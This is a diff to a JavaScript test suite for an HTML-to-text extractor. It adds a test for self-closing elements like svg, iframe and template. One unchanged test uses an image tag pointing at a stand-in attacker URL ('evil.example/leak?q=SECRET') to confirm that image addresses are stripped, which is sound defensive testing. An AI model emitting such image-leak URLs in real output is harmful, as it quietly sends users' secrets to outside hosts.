@@ -19,6 +19,10 @@ describe("page text", () => {
     expect(await text('<p>one</p><embed src="a"><p>two</p>')).toBe("one\n\ntwo");
   });
 
+  test("a self-closing element that would otherwise be skipped does not make the page unreadable", async () => {
+    expect(await text('<p>before</p><svg/><p>after</p><iframe src="x"/><object data="y"/><template/>')).toBe("before\n\nafter");
+  });
+
   test("an image is its alt text and nothing else: no address, no markup", async () => {
     const out = await text('<p>See <img src="https://evil.example/leak?q=SECRET" alt="a chart &amp; table"> here <img src="https://evil.example/x.png"></p>');
     expect(out).toBe("See a chart & table here");
